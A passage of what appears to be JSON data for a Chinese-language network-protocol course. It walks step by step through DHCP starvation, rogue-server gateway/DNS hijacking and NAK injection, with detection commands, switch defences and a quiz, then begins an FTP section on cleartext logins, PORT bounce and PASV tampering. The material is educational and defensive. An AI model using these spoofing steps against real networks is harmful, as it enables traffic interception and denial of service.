服务器","label":"DISCOVER → 无 OFFER（地址池空），重试 4 次后超时","note":"客户端退回 169.254.x.x 链路本地地址，无法访问任何内网资源"}],"defense":"交换机启用 DHCP Snooping，把 DHCP 请求中的 chaddr 与数据帧源 MAC 比对，不一致即丢弃；同时对单端口可学到的 MAC 数量设上限（端口安全）。"},{"name":"Rogue DHCP Server","cn":"仿冒 DHCP 服务器（网关/DNS 投毒）","impact":"客户端拿到攻击者指定的网关与 DNS，全部流量与解析经攻击者中转，从“配错地址”升级为全面中间人","steps":[{"who":"合法客户端","to":"广播域","label":"DHCP DISCOVER（广播，xid=0x3d1e2f4a）","note":"广播意味着同网段所有主机都收到，包括攻击者"},{"who":"攻击者","to":"合法客户端","label":"抢先回 DHCP OFFER：yiaddr=192.168.0.100、opt3 网关=192.168.0.66、opt6 DNS=192.168.0.66、opt54=192.168.0.66","note":"比合法服务器早到几毫秒即可胜出；客户端不校验来源，只看 xid 与 op=2"},{"who":"合法客户端","to":"攻击者","label":"DHCP REQUEST（广播，opt54 指定 .66）","note":"客户端“选定”了攻击者；合法服务器听到 REQUEST 发现自己没被选中，收回提议"},{"who":"攻击者","to":"合法客户端","label":"DHCP ACK，opt51 租期=4294967295 秒","note":"超长租期让错误配置长期不被纠正，即使合法服务器恢复也抢不回来"},{"who":"合法客户端","to":"攻击者的网关","label":"此后所有出网流量发往 192.168.0.66，DNS 查询也发往它","note":"攻击者可选择性转发（用户感觉“网慢但能用”），同时记录全部明文凭据"}],"defense":"DHCP Snooping 划分信任端口：只有连接合法服务器或上行链路的端口可转发 DHCP 应答，非信任端口上收到的 DHCP 应答一律丢弃。"},{"name":"NAK / Release Injection","cn":"NAK 与释放报文注入","impact":"把已在正常使用的客户端从租约里踢出，制造地址冲突或强制其重新申请，为后续抢占与中间人创造窗口","steps":[{"who":"攻击者","to":"广播域","label":"嗅探到合法客户端的续租 REQUEST（xid=0x3d1e2f4a，ciaddr=192.168.0.100）","note":"在共享介质上，续租广播与应答都是可见的"},{"who":"攻击者","to":"合法客户端","label":"伪造 DHCP NAK：op=2、xid 一致、opt53=6、opt54=192.168.0.66","note":"客户端收到 NAK 必须立刻停用当前地址并回到 DISCOVER"},{"who":"合法客户端","to":"广播域","label":"放弃 .100，重新广播 DISCOVER","note":"客户端进入“无地址”状态，业务连接全部中断"},{"who":"攻击者","to":"DHCP 服务器","label":"抢先为 .100 提交 REQUEST 并完成绑定（或发 DECLINE 让服务器标记该地址不可用）","note":"受害者的地址被占；DECLINE 还能让服务器把好地址逐个标记为冲突而弃用"},{"who":"合法客户端","to":"攻击者的服务器","label":"重新申请时接受仿冒 OFFER，网关/DNS 被改写","note":"拒绝服务只是手段，真正目的是把客户端逼进攻击者的配置"}],"defense":"对非信任端口收到的 NAK/ACK 一律丢弃，并启用 ARP 与 DHCP Snooping 绑定表联动，让“地址属主变更”必须与服务器记录一致。"}],"defenses":[{"name":"DHCP Snooping：chaddr 与帧源 MAC 比对","how":"交换机拦截经过的 DHCP 报文，取出选项/固定头中的 chaddr，与二层帧的源 MAC 逐字节比对，不一致直接丢弃；同时记录 IP—MAC—端口—VLAN 形成绑定表。","limit":"只能防“一个真实网卡伪造多个身份”，防不住攻击者用多张真实网卡（或 MAC 可改的虚拟网卡）逐个申请；且需要交换机支持并在接入端口全部开启，一处漏配即失效。"},{"name":"端口信任划分（Trusted / Untrusted）","how":"把连向合法 DHCP 服务器或上行的端口设为信任端口，允许 DHCP 应答通过；面向终端的端口设为非信任，其上收到的所有 DHCP 服务器类报文（OFFER/ACK/NAK）一律丢弃。","limit":"依赖拓扑正确：一旦有人把家用路由器插进非信任端口并自行发放地址（这在实际网络中极常见），或者信任端口被误配到接入侧，防线即刻失效。"},{"name":"绑定表 + 动态 ARP 检测（DAI）","how":"Snooping 建立 IP—MAC—端口—VLAN 绑定表后，交换机对每个 ARP 报文校验“源 IP 与源 MAC 是否与表一致”，不一致则丢弃，从而阻断基于 ARP 的网关冒充。","limit":"绑定表只对“经过 DHCP 的地址”有效，静态配置 IP 的主机与服务器不在表内，需要手工绑定；表项容量有限，大规模网络会被表满拖累。"},{"name":"802.1X 端口认证","how":"在端口层要求设备先完成身份认证（证书/EAP）才允许接入，未认证端口只放行认证流量，从根本上阻止陌生设备接入广播域。","limit":"部署成本高，需要认证服务器与客户端配合；打印机、摄像头、IoT 等设备常不支持 802.1X，只能开 MAB 例外，例外端口就是缺口。"}],"calcs":["cidr"],"quiz":[{"q":"DHCP 的 REQUEST 为什么也要广播，而不是单播给选中的服务器？","options":["因为客户端还不知道自己的 IP","为了让所有发过 OFFER 的服务器都知道自己没被选中，从而收回提议","因为 UDP 不支持单播"],"a":1,"why":"广播让未被选中的服务器立刻释放“待确认”的地址，是资源回收设计；副作用是地址池信息暴露在同网段内，攻击者因此能掌握池的规模与使用情况。"},{"q":"饥饿攻击为什么必须同时伪造 chaddr（有时还有选项 61）？","options":["因为服务器按客户端标识分配地址，换一个标识就是一台“新客户端”","因为 chaddr 未通过校验就无法发包","因为 MAC 地址会被加密"],"a":0,"why":"服务器按 MAC/client identifier 记忆绑定关系，伪造不同标识就能不断索取新地址；只改一个字段时若服务器采用另一个字段做主键，攻击就不生效。"},{"q":"DHCP Snooping 的端口信任划分，防的是哪一类攻击？","options":["地址池耗尽","仿冒服务器下发错误网关/DNS","DHCP 报文被加密"],"a":1,"why":"终端只应“发请求”不应“发应答”，所以按“谁能说服务器的话”划分端口，就把非授权服务器挡在门外；饥饿攻击靠的是 chaddr 与帧源 MAC 比对，不是端口信任。"}]},"script":{"id":"dhcp","notes":{"xid":{"short":"事务标识，配对请求与应答","more":"4 字节随机数，客户端生成，服务器在 OFFER/ACK 中原样返回。客户端只靠它确认“这条应答回的是我的请求”，不校验对方身份。","sec":"只要 xid 对上，伪造应答就能被接受——这是仿冒服务器唯一必须猜对的字段。"},"chaddr":{"short":"客户端 MAC，地址按它记忆","more":"16 字节，前 hlen（6）字节有效。服务器按这个 MAC 分配与记忆地址，因此改 chaddr 就等于换了一台新机器。","sec":"饥饿攻击伪造的就是这里；Snooping 校验的也是这里。"},"yiaddr":{"short":"分给客户端的地址，可任意填","more":"“your IP”。服务器在 OFFER/ACK 中填入选定的地址，客户端在收到 ACK 后把它配到网卡上。仿冒服务器可以填任意值。","sec":"填成隔离网段或攻击者主机的地址，就等于把客户端引走。"},"giaddr":{"short":"中继地址，服务器完全相信它","more":"中继代理转发时填入自己面向客户端的接口地址，服务器据此判断请求来自哪个子网并从对应地址池取地址。","sec":"伪造 giaddr 就能让服务器从别的子网发地址，造成跨网段错配。"},"opt53":{"short":"报文类型，8 种之一","more":"TLV 结构：0x35 + 长度 1 + 值。1 DISCOVER、2 OFFER、3 REQUEST、5 ACK、6 NAK、7 RELEASE，每个报文的第一条选项都是它。","sec":"终端只会发 1/3/7/8，出现 2/5/6 就说明有“服务器”在这个端口上说话。"},"opt61":{"short":"客户端标识，真正的身份字段","more":"长度 7：类型 1（以太网）+ 6 字节 MAC。它才是“客户端身份”的正式表达，服务器应当用它而非 chaddr 做绑定，避免语义重叠。","sec":"只改 chaddr 不改 opt61 的实现会被识别为同一个人。"},"opt51-val":{"short":"租期，写多长就绑多久","more":"32 位秒数。客户端据此算出 T1=0.5T 续租、T2=0.875T 改广播，到期必须停用地址。","sec":"写成 4294967295 等于让错误配置在重启前永不失效，异常长租期是硬检测规则。"},"opt54-val":{"short":"服务器标识，客户端认谁","more":"合法服务器的 IPv4 地址，客户端此后把 REQUEST 单播到这个地址。它决定了客户端心里“谁是服务器”。","sec":"仿冒者把它写自己，客户端之后所有续租都只找攻击者。"},"opt03-val":{"short":"默认网关，全部出网流量的第一跳","more":"可含多个地址，客户端所有非本地流量都发往这里。它是把“配错地址”升级为“全面中间人”的那一个开关。","sec":"改成攻击者主机，明文凭据与全部流量都先过他手。"},"opt06-val":{"short":"DNS 服务器，解析结果的来源","more":"客户端的首选解析器。改了它，后续所有域名解析都可被引导到攻击者指定的地址，也是伪造站点最省事的一步。","sec":"网关与 DNS 同时被改，等于把出网判断和名字解析一起接管。"}},"acts":[{"key":"normal","no":"第 1 幕","title":"它正常怎么工作","desc":"四报文换来四参数：谁能先答，谁就赢","lead":"先看一次开机取址。注意客户端在拿到配置之前没有任何身份，也没有任何验证手段。","scenes":[{"name":"DORA 四报文与续租","cmds":{"linux":[{"c":"sudo dhclient -v eth0","n":"-v 打印完整 DORA 四步与拿到的租期","s":"补充（vault 无 dhclient，DHCP 客户端调试必备）"},{"c":"sudo tcpdump -ni eth0 -vv 'udp port 67 or udp port 68'","n":"抓 DORA：看 xid 是否配对、yiaddr 是多少","s":"补充（vault 无 tcpdump，抓包必备）"},{"c":"ip addr show eth0","n":"拿到的地址与掩码，与 ACK 里的 opt1 对照","s":"《系统》Linux.md · ip"}],"ps":[{"c":"Get-NetIPAddress -AddressFamily IPv4 | Select-Object InterfaceAlias,IPAddress,PrefixLength","n":"地址、掩码、接口一屏看完","s":"《系统》PowerShell.md · Get-NetIPAddress"},{"c":"Get-NetIPConfiguration -Detailed","n":"网关、DNS、DHCP 服务器是谁，一条命令全出","s":"补充（vault 未收录 Get-NetIPConfiguration）"}],"cmd":[{"c":"ipconfig /all","n":"租约获得与到期时间、DHCP 服务器地址都在里面","s":"《系统》Windows CMD.md · ipconfig"},{"c":"netsh interface ip show config","n":"每块网卡的完整配置，含 DHCP 是否启用","s":"《系统》Windows CMD.md · netsh"}]},"steps":[{"who":"客户端","to":"广播","pkt":0,"bubble":"DISCOVER","hl":["op","xid","chaddr","opt53"],"vals":{"op":"1 BOOTREQUEST","xid":"0x3d1e2f4a","chaddr":"00:11:22:33:44:55","opt53":"1 DISCOVER"},"say":"还没有地址，源 IP 只能是 0.0.0.0，只能朝全网喊。","sub":"chaddr 是服务器记地址的唯一依据。"},{"who":"服务器","to":"客户端","pkt":1,"bubble":"OFFER","hl":["op","yiaddr","xid","options"],"vals":{"op":"2 BOOTREPLY","yiaddr":"192.168.0.100","xid":"0x3d1e2f4a（原样回）"},"say":"服务器挑一个地址放进 yiaddr，用同一个 xid 表示“这是给你的”。","sub":"几台服务器都会发，客户端可能收到好几个。"},{"who":"客户端","to":"广播","pkt":0,"bubble":"REQUEST","hl":["opt53","opt61","chaddr"],"vals":{"opt53":"3 REQUEST","opt61":"01 00 11 22 33 44 55"},"say":"广播说“我要这个”，让没被选中的服务器收回各自提议。","sub":"这条广播连攻击者的耳朵也一起喂了。"},{"who":"服务器","to":"客户端","pkt":2,"bubble":"ACK 四参数","hl":["opt51-val","opt01-val","opt03-val","opt06-val"],"vals":{"opt51-val":"3600 秒（T1=1800、T2=3150）","opt01-val":"255.255.255.0","opt03-val":"192.168.0.254","opt06-val":"192.168.0.253"},"say":"租期与掩码、网关、DNS 一起下发，客户端这才配好四样东西。","sub":"全部信任，无一验证。"},{"who":"客户端","to":"服务器","pkt":0,"bubble":"T1 续租","hl":["xid","secs","ciaddr","opt53"],"vals":{"xid":"新一轮新值","secs":"1800（= T1）","ciaddr":"192.168.0.100","opt53":"3 REQUEST"},"say":"到租期一半单播回原服务器续租；没回应就在 87.5% 时改广播。","sub":"计时器保证错误配置最迟一个租期自愈。"}]}]},{"key":"attack","no":"第 2 幕","title":"它会被怎么打","desc":"抢答的把网关指给自己；刷 MAC 的把地址池吃空","lead":"两个场景各打一面：仿冒打的是“谁先答”，饥饿打的是“地址有限”。","scenes":[{"name":"仿冒 DHCP 服务器","cmds":{"linux":[{"c":"sudo dhclient -v -r eth0 && sudo dhclient -v eth0","n":"释放再申请，最容易撞上仿冒服务器","s":"补充（vault 无 dhclient，DHCP 客户端调试必备）"},{"c":"sudo tcpdump -ni eth0 -vv 'udp port 67 or udp port 68'","n":"看同一个 xid 有几个 OFFER，源 IP 分别是谁","s":"补充（vault 无 tcpdump，抓包必备）"},{"c":"ip route show default","n":"默认网关是否被改成陌生地址","s":"《系统》Linux.md · ip"}],"ps":[{"c":"Get-NetIPConfiguration | Select-Object InterfaceAlias,IPv4Address,IPv4DefaultGateway","n":"网关被改一眼可见","s":"补充（vault 未收录 Get-NetIPConfiguration）"},{"c":"Get-NetIPAddress -AddressFamily IPv4","n":"对比地址与掩码是否落在预期网段","s":"《系统》PowerShell.md · Get-NetIPAddress"}],"cmd":[{"c":"ipconfig /all","n":"DHCP 服务器一栏若不是预期设备，就是仿冒","s":"《系统》Windows CMD.md · ipconfig"},{"c":"netsh interface ip show config","n":"网关与 DNS 逐项与基线比对","s":"《系统》Windows CMD.md · netsh"}]},"steps":[{"who":"客户端","to":"广播","pkt":0,"bubble":"DISCOVER","hl":["op","xid","chaddr"],"vals":{"op":"1 BOOTREQUEST","xid":"0x3d1e2f4a"},"say":"开机广播一次，谁先答谁赢——协议里没有“服务器身份”这一说。","sub":"身份真空期就是攻击窗口。"},{"who":"攻击者","to":"客户端","pkt":1,"evil":true,"bubble":"抢先 OFFER","hl":["op","yiaddr","siaddr","options"],"vals":{"op":"2 BOOTREPLY","yiaddr":"192.168.0.66","siaddr":"192.168.0.66","options":"53=2 OFFER，54=192.168.0.66"},"say":"攻击者抢在合法服务器之前回 OFFER，把自己写成服务器标识。","sub":"xid 对得上，客户端就认。"},{"who":"客户端","to":"广播","pkt":0,"bubble":"REQUEST","hl":["opt53","chaddr"],"vals":{"opt53":"3 REQUEST","chaddr":"00:11:22:33:44:55"},"say":"客户端接受这个提议并广播确认，合法服务器的 OFFER 被丢弃。","sub":"它只比快慢，不比真假。"},{"who":"攻击者","to":"客户端","pkt":2,"evil":true,"bubble":"假四参数","hl":["opt51-val","opt03-val","opt06-val"],"vals":{"opt51-val":"86400（租期拉长，劫持更久）","opt03-val":"192.168.0.66（网关＝攻击者）","opt06-val":"192.168.0.66（DNS 也归他）"},"say":"ACK 里把网关和 DNS 都指给自己，租期还拉长到一天。","sub":"配错地址直接升级为全面中间人。"},{"who":"受害者","to":"攻击者（被当作网关）","pkt":1,"bubble":"全部流量过境","hl":["yiaddr","giaddr","options"],"vals":{"yiaddr":"192.168.0.66","options":"opt3/opt6 均指向 192.168.0.66"},"say":"此后出网流量与域名查询先到 192.168.0.66，明文凭据随手可捡。","sub":"用户侧只觉慢，偶有证书告警。"}]},{"name":"地址耗尽（饥饿攻击）","cmds":{"linux":[{"c":"sudo nmap --script broadcast-dhcp-discover","n":"广播探一次，看还有没有服务器肯给地址","s":"补充（vault 无 nmap，DHCP 探测脚本）"},{"c":"sudo dhclient -v eth0","n":"饥饿期间客户端一直 DISCOVER，拿不到 OFFER","s":"补充（vault 无 dhclient，DHCP 客户端调试必备）"},{"c":"sudo tcpdump -ni eth0 -vv 'udp port 67' | grep -c 'DHCP-Discover'","n":"统计 DISCOVER 数量与不同 MAC","s":"补充（vault 无 tcpdump，抓包必备）"}],"ps":[{"c":"Get-NetIPAddress -AddressFamily IPv4 | Measure-Object | Select-Object Count","n":"拿不到地址时只剩回环与自动专用地址","s":"《系统》PowerShell.md · Get-NetIPAddress"},{"c":"Get-NetAdapter | Select-Object Name,Status,LinkSpeed","n":"链路 Up 但没地址，正是饥饿的表现","s":"补充（vault 未收录 Get-NetAdapter）"}],"cmd":[{"c":"ipconfig /all","n":"出现 169.254.x.x 自动专用地址即 DHCP 失败","s":"《系统》Windows CMD.md · ipconfig"},{"c":"ipconfig /release && ipconfig /renew","n":"手动重试，观察是否仍然超时","s":"《系统》Windows CMD.md · ipconfig"}]},"steps":[{"who":"攻击者","to":"服务器","pkt":0,"evil":true,"bubble":"伪造 chaddr","hl":["chaddr","opt61","opt53"],"vals":{"chaddr":"02:00:00:00:00:01（伪造）","opt61":"01 02 00 00 00 00 01","opt53":"1 DISCOVER"},"say":"每轮换一个假 MAC 发 DISCOVER，服务器就认为来了台新机器。","sub":"地址按 MAC 记，换 MAC 等于换人。"},{"who":"服务器","to":"攻击者","pkt":1,"bubble":"OFFER 新地址","hl":["yiaddr","chaddr","options"],"vals":{"yiaddr":"192.168.0.101","chaddr":"02:00:00:00:00:01"},"say":"服务器从池子里再切一个地址出来，池水位降一格。","sub":"它没有任何理由怀疑这个 MAC。"},{"who":"攻击者","to":"服务器","pkt":0,"evil":true,"bubble":"REQUEST 占住","hl":["opt53","chaddr","xid"],"vals":{"opt53":"3 REQUEST","chaddr":"02:00:00:00:00:01","xid":"每轮新值"},"say":"发 REQUEST 走完流程，这个地址就被真正绑定，不再释放。","sub":"只发 DISCOVER 不请求，池子还能回收。"},{"who":"攻击者","to":"服务器","pkt":2,"evil":true,"bubble":"循环数千次","hl":["opt54-val","opt51-val"],"vals":{"opt54-val":"合法服务器（它并不知情）","opt51-val":"3600 秒 × 上千条"},"say":"换 MAC 重复几千轮，几百个地址的池子几分钟见底。","sub":"成本只是一条脚本。"},{"who":"合法客户端","to":"服务器","pkt":0,"bubble":"DISCOVER 无应答","hl":["opt53","ciaddr","secs"],"vals":{"opt53":"1 DISCOVER","ciaddr":"0.0.0.0（仍然没有地址）","secs":"重试计数一路上涨"},"say":"合法主机反复重试也拿不到 OFFER，配置层的拒绝服务成立。","sub":"网线插着，却上不了网。"}]}]},{"key":"defend","no":"第 3 幕","title":"防护在哪一步掐断它","desc":"把“配置阶段的事实”固化成绑定表，运行期一律对账","lead":"两条攻击重放：伪造 chaddr 被比对掉，仿冒应答被端口信任划分挡在交换机上。","scenes":[{"name":"DHCP Snooping + 端口信任 + DAI","cmds":{"linux":[{"c":"sudo tcpdump -ni eth0 -vv 'udp port 67 or udp port 68'","n":"Snooping 生效后，伪造 OFFER 一个都抓不到","s":"补充（vault 无 tcpdump，抓包必备）"},{"c":"ip neigh show","n":"DAI 生效后，网关的 MAC 不会突然变成陌生地址","s":"《系统》Linux.md · ip"},{"c":"sudo dhclient -v eth0","n":"正常客户端仍能一轮拿全四参数，说明放行没误伤","s":"补充（vault 无 dhclient，DHCP 客户端调试必备）"}],"ps":[{"c":"Get-NetIPConfiguration -Detailed","n":"网关、DNS、DHCP 服务器三项是否符合基线","s":"补充（vault 未收录 Get-NetIPConfiguration）"},{"c":"Get-NetNeighbor -AddressFamily IPv4 | Where-Object State -ne 'Unreachable'","n":"ARP 邻居表，看网关 MAC 有没有漂移","s":"《系统》PowerShell.md · Get-NetNeighbor"}],"cmd":[{"c":"arp -a","n":"网关 IP 对应的 MAC 是否固定","s":"《系统》Windows CMD.md · arp"},{"c":"netsh interface ip show config","n":"复核最终配置是否来自可信服务器","s":"《系统》Windows CMD.md · netsh"}]},"steps":[{"who":"交换机（Snooping）","to":"攻击者","pkt":0,"bubble":"chaddr 比对","hl":["chaddr","opt61","opt53"],"vals":{"chaddr":"02:00:00:00:00:02 ≠ 帧源 MAC","opt61":"01 02 00 00 00 00 02","opt53":"1 DISCOVER → 丢弃"},"say":"Snooping 比对 chaddr 与数据帧源 MAC，不一致直接丢包。","sub":"伪造上千个 MAC，得有上千张真网卡。"},{"who":"攻击者","to":"交换机","pkt":1,"evil":true,"bubble":"非信任端口","hl":["op","yiaddr","options"],"vals":{"op":"2 BOOTREPLY（终端不该发应答）","yiaddr":"192.168.0.66"},"say":"终端口只许发请求，从非信任端口来的 DHCP 应答一律丢弃。","sub":"仿冒服务器连应答都出不了端口。"},{"who":"交换机（信任端口）","to":"合法服务器","pkt":2,"bubble":"只放行信任端口","hl":["opt54-val","opt51-val","opt03-val"],"vals":{"opt54-val":"192.168.0.1（已登记）","opt51-val":"3600 秒","opt03-val":"192.168.0.254"},"say":"只有连合法服务器的信任端口才能下发 ACK，配置来源被限定。","sub":"谁能说“服务器的话”，由端口决定。"},{"who":"交换机（绑定表）","to":"自身","pkt":2,"bubble":"记录事实","hl":["opt01-val","opt03-val","opt06-val"],"vals":{"opt01-val":"255.255.255.0","opt03-val":"192.168.0.254","opt06-val":"192.168.0.253"},"say":"把 IP—MAC—端口—VLAN 记成绑定表，配置阶段的事实被固化。","sub":"运行期的任何声明都要与它对账。"},{"who":"交换机（DAI）","to":"受害者","pkt":1,"bubble":"ARP 对账","hl":["yiaddr","chaddr","giaddr"],"vals":{"yiaddr":"192.168.0.100（表里属于另一 MAC）","chaddr":"02:00:…（与表不符）"},"say":"声称拥有某地址的 ARP 与绑定表不符就被丢弃，中间人断链。","sub":"配置层与运行层共用同一张事实表。"}]}]}]}},{"proto":{"id":"ftp","name":"FTP","cn":"文件传送协议","en":"File Transfer Protocol","layer":"application","chapter":"第五章","extra":false,"oneLine":"把控制与数据拆成两条 TCP 连接的文件搬运协议，命令与口令全程明文，安全性只能靠外挂的 TLS 或 SSH。","sections":[{"h":"一次文件传送被拆成两条 TCP 连接","p":"FTP（File Transfer Protocol，文件传送协议）把一次会话拆成两条 TCP 连接：控制连接固定连到服务器的 21 端口，整个会话期间一直保持，只承载命令与应答；数据连接按需临时建立，传完即关闭。这不是冗余设计，而是 1971 年的工程折中——单条 TCP 连接在半双工条件下没法一边灌大量文件数据一边及时回送控制指令，指令会被数据淹没。在没有多路复用机制的年代，只能用两条物理连接实现信令与数据的逻辑解耦。今天 HTTP/2 在同一连接里用流做逻辑复用，FTP 用两条连接做物理分离，面对的是同一个需求。"},{"h":"命令是四字母加参数，应答是三位数字","p":"控制连接上的报文是 NVT-ASCII 文本行，命令形如 COMMAND 加空格加参数，以 CRLF 结尾；命令不区分大小写而参数区分。服务器应答以三位数字开头：第一位表示成败（2 成功、3 中间态、4 暂时失败、5 永久失败），第二位表示类别，第三位细分。登录序列固定为 USER 得到 331（需要口令）、PASS 得到 230（登录成功）或 530（未登录）。这套应答码既是协议状态机的公开说明书，也是攻击者的地图：530 说明这组凭据无效，230 说明有效，而 PASS 那一行里的口令，全程明文躺在 TCP 载荷中。"},{"h":"主动模式：PORT 把客户端地址与端口编码进命令","p":"主动模式下客户端先发 PORT 命令，参数是 6 个十进制数：前四个用逗号分隔构成 32 位 IPv4 地址，后两个是 16 位端口的高低字节，端口号等于高字节乘 256 加低字节，例如 PORT 192,168,1,2,19,137 表示 5001 端口。服务器收到后从自己的 20 端口主动连向该地址与端口。问题有两层：服务器主动入站会被客户端防火墙拦截；更严重的是这条命令让客户端可以指定服务器去连谁，攻击者填第三方地址就能借服务器之手做端口扫描或流量反弹，也就是 FTP bounce。"},{"h":"被动模式：客户端连出才穿得过 NAT","p":"被动模式由客户端发 PASV，服务器打开一个临时端口，并在 227 应答里用同样的 6 数字格式告知地址与端口，随后由客户端主动连出。连接方向与防火墙放内出、阻外入的默认策略一致，因此成为今天客户端的默认选择。代价是服务器侧要开放一大段临时端口，防火墙必须动态放行，攻击面从客户端转移到服务器；同时 227 应答里的地址成了可篡改目标——中间人把它换成自己的地址，数据就流向攻击者，而控制连接看起来毫无异常。"},{"h":"ASCII 与 Binary：TYPE 决定字节是否被改写","p":"TYPE 命令选择数据的表示类型。TYPE A（ASCII）是默认值，规定数据以 8 位 NVT-ASCII 表示、行结束统一为 CRLF，接收方再转回本地格式；TYPE I（Image，即二进制）把数据当作连续比特装进 8 位传输字节，不做任何转换。这条差别是实际事故的常见来源：用 ASCII 模式传可执行文件或压缩包，0x0A 前后会被插入或删除 0x0D，文件长度与哈希全变，解压直接失败；反过来用二进制模式传文本，Windows 与 Unix 的行结束差异就留给用户自己处理。类型协商没有任何完整性校验，改一个字母就能让对端拿错的数据还以为成功。"}],"packets":[{"title":"控制连接上的登录命令（NVT-ASCII 文本行）","note":"一条命令就是一行可打印字符，凭据没有任何加密层","hex":"55 53 45 52 20 61 6e 6f 6e 79 6d 6f 75 73 0d 0a","fields":[{"name":"Command","cn":"命令码","off":0,"len":4,"bits":"","tone":"cmd","desc":"四个字母的命令动词，大小写不敏感。USER 是登录第一步，服务器据此查本地账户表或匿名配置，决定回 331 还是 530。","sec":"命令动词本身就是协议指纹；只放行必要命令（禁用 SITE、PORT）能直接砍掉一批历史漏洞。"},{"name":"SP","cn":"参数分隔符","off":4,"len":1,"bits":"","tone":"sep","desc":"单个空格，命令与参数之间的强制分隔符。RFC 959 允许命令与参数之间有一个或多个空格。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"Argument","cn":"参数：用户名","off":5,"len":9,"bits":"","tone":"arg","desc":"本例 anonymous，触发匿名登录分支。真实登录时这里是账户名，明文可见，可被直接枚举出系统上存在哪些账户。","sec":"用户名的明文暴露让攻击者能区分\"账户不存在\"与\"口令错误\"，为撞库省掉一半试错成本。"},{"name":"CRLF","cn":"行结束符","off":14,"len":2,"bits":"","tone":"term","desc":"回车加换行（0x0D 0x0A），NVT-ASCII 规定的行结束，也是命令解析的边界。","sec":"只认 LF 的容错解析会让同一条命令在不同实现里被切成不同条数，是命令走私类问题的来源。"}]},{"title":"TYPE 命令：ASCII 与二进制只差一个字母","note":"TYPE I 让字节原样通过；TYPE A 会按 NVT 规则改写行结束","hex":"54 59 50 45 20 49 0d 0a","fields":[{"name":"Command","cn":"命令码","off":0,"len":4,"bits":"","tone":"cmd","desc":"TYPE 选择数据连接的表示类型，是传输前必须确定的一项语义约定。","sec":"类型协商被篡改会让接收方用错误的解码方式还原文件，破坏完整性而不报错。"},{"name":"SP","cn":"分隔符","off":4,"len":1,"bits":"","tone":"sep","desc":"命令与类型参数之间的空格。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"Type Code","cn":"表示类型码","off":5,"len":1,"bits":"","tone":"arg","desc":"I 表示 Image（二进制，8 位字节原样传输，不做任何转换）；A 是默认的 ASCII 类型，发送方转成 NVT-ASCII 并把行结束统一为 CRLF，接收方再转回本地格式；此外还有 E（EBCDIC）与 L（本地字节长度）。","sec":"用 A 模式传二进制会插入或删除 0x0D，文件长度与哈希全变却仍显示\"传输成功\"——这种无声损坏比失败更危险。"},{"name":"CRLF","cn":"行结束符","off":6,"len":2,"bits":"","tone":"term","desc":"命令行的结束标记。","sec":"本字段在常见攻击中不作为独立手段。"}]},{"title":"PORT 命令（主动模式）：把 IPv4 地址与端口编码成 6 个十进制数","note":"端口号 = 高字节 × 256 + 低字节 = 19 × 256 + 137 = 5001","hex":"50 4f 52 54 20 31 39 32 2c 31 36 38 2c 31 2c 32 2c 31 39 2c 31 33 37 0d 0a","fields":[{"name":"Command","cn":"命令码","off":0,"len":4,"bits":"","tone":"cmd","desc":"PORT 告诉服务器\"请连到我这个地址和端口\"，是主动模式的数据连接参数。","sec":"这条命令把\"连向何处\"的决定权交给了客户端，是反弹类攻击的原语。"},{"name":"SP","cn":"分隔符","off":4,"len":1,"bits":"","tone":"sep","desc":"命令与参数之间的空格。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"Host Address","cn":"主机地址 h1.h2.h3.h4","off":5,"len":11,"bits":"","tone":"addr","desc":"四个 8 位字段以十进制字符串写出、逗号分隔，拼成 32 位 IPv4 地址，本例 192.168.1.2。RFC 959 没有要求它必须等于控制连接的源地址。","sec":"正是这个\"不要求\"让攻击者可以填第三方地址，让服务器替自己去连别人，形成 FTP bounce 扫描。"},{"name":"Comma","cn":"字段分隔逗号","off":16,"len":1,"bits":"","tone":"sep","desc":"第 4 个地址字节与端口高字节之间的逗号。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"Port High","cn":"端口高字节 p1","off":17,"len":2,"bits":"","tone":"port","desc":"端口的 16 位值右移 8 位得到的十进制数，本例 19（0x13）。","sec":"端口可被指向任意值，包括 1-1023 的知名端口，使扫描结果具备明确语义。"},{"name":"Comma","cn":"字段分隔逗号","off":19,"len":1,"bits":"","tone":"sep","desc":"端口高低字节之间的逗号。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"Port Low","cn":"端口低字节 p2","off":20,"len":3,"bits":"","tone":"port","desc":"端口的低 8 位，本例 137（0x89）。19 × 256 + 137 = 5001，这就是客户端在监听的数据端口。","sec":"低字节可自由选择，使攻击者能用同一台服务器测试大量端口。"},{"name":"CRLF","cn":"行结束符","off":23,"len":2,"bits":"","tone":"term","desc":"命令行结束标记。","sec":"本字段在常见攻击中不作为独立手段。"}]},{"title":"PASV 应答 227：服务器把临时端口告诉客户端","note":"括号里的 6 个数字是 (h1,h2,h3,h4,p1,p2)，本例 195×256+80 = 50000","hex":"32 32 37 20 45 6e 74 65 72 69 6e 67 20 50 61 73 73 69 76 65 20 4d 6f 64 65 20 28 31 39 32 2c 31 36 38 2c 31 2c 31 30 2c 31 39 35 2c 38 30 29 2e 0d 0a","fields":[{"name":"Reply Code","cn":"应答码","off":0,"len":3,"bits":"","tone":"code","desc":"227 专指\"进入被动模式\"，后面必须带括号内的地址端口参数。三位数字的第一位表示成败，2 为成功。","sec":"应答码是协议状态机的公开语义，攻击者据此判断服务器支持哪些能力、处于哪个阶段。"},{"name":"SP","cn":"分隔符","off":3,"len":1,"bits":"","tone":"sep","desc":"应答码与说明文本之间的空格。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"Reply Text","cn":"人读说明","off":4,"len":22,"bits":"","tone":"text","desc":"Entering Passive Mode，纯粹给人看的文本，解析器只认括号里的数字。","sec":"文本与参数可能不一致：安全设备按文本告警、客户端按数字连接，这个差异可被用来绕过检测。"},{"name":"Pasv Argument","cn":"被动模式参数 (h1,h2,h3,h4,p1,p2)","off":26,"len":22,"bits":"","tone":"addr","desc":"与 PORT 命令同样的 6 数字格式，给出服务器正在监听的地址与临时端口，本例 192.168.1.10:50000。","sec":"中间人把它改成自己的地址，客户端就会把文件数据发往攻击者，而控制连接看起来一切正常。"},{"name":"CRLF","cn":"行结束符","off":48,"len":2,"bits":"","tone":"term","desc":"应答行结束标记。","sec":"本字段在常见攻击中不作为独立手段。"}]}],"attacks":[{"name":"Cleartext Credential Sniffing","cn":"明文口令嗅探","impact":"账户被完整接管，服务器日志里看起来只是一次正常登录。","steps":[{"who":"客户端","to":"FTP 服务器","label":"USER admin\\r\\n","note":"控制连接建立，凭据开始以 NVT-ASCII 